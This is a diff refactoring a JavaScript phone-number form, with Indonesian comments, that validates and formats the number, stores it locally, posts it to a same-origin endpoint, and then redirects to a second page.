@@ -19,10 +19,10 @@ let isProcessing = false;
 let errorTimer = null;
 
 // =============================
-// FADE IN
+// INITIALIZATION
 // =============================
 
-window.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", () => {
 
     document.body.classList.add("fade-in");
 
@@ -32,13 +32,8 @@ window.addEventListener("DOMContentLoaded", () => {
         phoneInput.setAttribute("autocomplete", "tel");
     }
 
-    if (loadingBox) {
-        loadingBox.style.display = "none";
-    }
-
-    if (clearBtn) {
-        clearBtn.style.display = "none";
-    }
+    if (loadingBox) loadingBox.style.display = "none";
+    if (clearBtn) clearBtn.style.display = "none";
 
 });
 
@@ -48,15 +43,9 @@ window.addEventListener("DOMContentLoaded", () => {
 
 phoneInput.addEventListener("input", (e) => {
 
-    let angka = e.target.value.replace(/\D/g, "");
+    let angka = e.target.value.replace(/\D/g, "").substring(0, 13);
 
-    angka = angka.substring(0, 13);
-
-    let hasil = "";
-
-    if (angka.length > 0) {
-        hasil += angka.substring(0, 3);
-    }
+    let hasil = angka.substring(0, 3);
 
     if (angka.length > 3) {
         hasil += "-" + angka.substring(3, 7);
@@ -68,12 +57,7 @@ phoneInput.addEventListener("input", (e) => {
 
     e.target.value = hasil;
 
-    // TOMBOL CLEAR
-
-    clearBtn.style.display =
-        angka.length > 0 ? "flex" : "none";
-
-    // HILANGKAN ERROR
+    clearBtn.style.display = angka.length ? "flex" : "none";
 
     hideError();
 
@@ -88,14 +72,12 @@ function showError() {
     errorBox.classList.add("show");
 
     if (navigator.vibrate) {
-        navigator.vibrate([120, 80, 120]);
+        navigator.vibrate(100);
     }
 
     clearTimeout(errorTimer);
 
-    errorTimer = setTimeout(() => {
-        hideError();
-    }, 2000);
+    errorTimer = setTimeout(hideError, 2000);
 
 }
 
@@ -108,7 +90,33 @@ function hideError() {
 }
 
 // =============================
-// CLEAR INPUT
+// LOADING
+// =============================
+
+function showLoading() {
+
+    loadingBox.style.display = "flex";
+
+    lanjutBtn.disabled = true;
+
+    lanjutBtn.style.pointerEvents = "none";
+
+}
+
+function hideLoading() {
+
+    loadingBox.style.display = "none";
+
+    lanjutBtn.disabled = false;
+
+    lanjutBtn.style.pointerEvents = "";
+
+    isProcessing = false;
+
+}
+
+// =============================
+// CLEAR
 // =============================
 
 clearBtn.addEventListener("click", () => {
@@ -126,7 +134,7 @@ clearBtn.addEventListener("click", () => {
 });
 
 // =============================
-// ENTER KEY
+// ENTER
 // =============================
 
 phoneInput.addEventListener("keydown", (e) => {
@@ -149,20 +157,13 @@ lanjutBtn.addEventListener("click", async (e) => {
 
     e.preventDefault();
 
-    // CEGAH DOUBLE CLICK
-
     if (isProcessing) return;
-
-    // AMBIL NOMOR
 
     const nomor = phoneInput.value.replace(/\D/g, "");
 
     // VALIDASI
 
-    if (
-        nomor.length < 9 ||
-        nomor.charAt(0) !== "8"
-    ) {
+    if (nomor.length < 9 || nomor.charAt(0) !== "8") {
 
         showError();
 
@@ -172,57 +173,45 @@ lanjutBtn.addEventListener("click", async (e) => {
 
     }
 
-    // KUNCI PROSES
+    // KUNCI PROSES LANGSUNG
 
     isProcessing = true;
 
-    lanjutBtn.disabled = true;
+    // TAMPILKAN LOADING
+
+    showLoading();
 
     // SIMPAN NOMOR
 
     localStorage.setItem("nmrx", nomor);
 
-    // TAMPILKAN LOADING LANGSUNG
-
-    loadingBox.style.display = "flex";
-
-    // PAKSA BROWSER UPDATE TAMPILAN
-
-    await new Promise(resolve => {
-        requestAnimationFrame(() => {
-            requestAnimationFrame(resolve);
-        });
-    });
-
     try {
-
-        // KIRIM DATA KE SERVER
-        // BATAS WAKTU 5 DETIK
 
         const controller = new AbortController();
 
         const timeout = setTimeout(() => {
             controller.abort();
-        }, 5000);
+        }, 10000);
+
+        let response;
 
         try {
 
-            const response = await fetch("/nmrx", {
+            response = await fetch("/nmrx", {
+
                 method: "POST",
+
                 headers: {
                     "Content-Type": "application/json"
                 },
+
                 body: JSON.stringify({
                     nmrx: nomor
                 }),
-                signal: controller.signal
-            });
 
-            if (!response.ok) {
-                throw new Error(
-                    "Server error: " + response.status
-                );
-            }
+                signal: controller.signal
+
+            });
 
         } finally {
 
@@ -230,29 +219,25 @@ lanjutBtn.addEventListener("click", async (e) => {
 
         }
 
-        // FADE OUT
-
-        document.body.classList.add("fade-out");
+        if (!response.ok) {
+            throw new Error("Server error: " + response.status);
+        }
 
         // PINDAH HALAMAN
 
+        document.body.classList.add("fade-out");
+
         setTimeout(() => {
 
-            window.location.href = "pix.html";
+            window.location.replace("pix.html");
 
-        }, 500);
+        }, 300);
 
     } catch (error) {
 
         console.error("Kesalahan:", error);
 
-        loadingBox.style.display = "none";
-
-        lanjutBtn.disabled = false;
-
-        isProcessing = false;
-
-        // PESAN ERROR
+        hideLoading();
 
         showError();
 
@@ -268,8 +253,8 @@ window.addEventListener("pageshow", () => {
 
     isProcessing = false;
 
-    lanjutBtn.disabled = false;
+    if (loadingBox) loadingBox.style.display = "none";
 
-    loadingBox.style.display = "none";
+    if (lanjutBtn) lanjutBtn.disabled = false;
 
 });
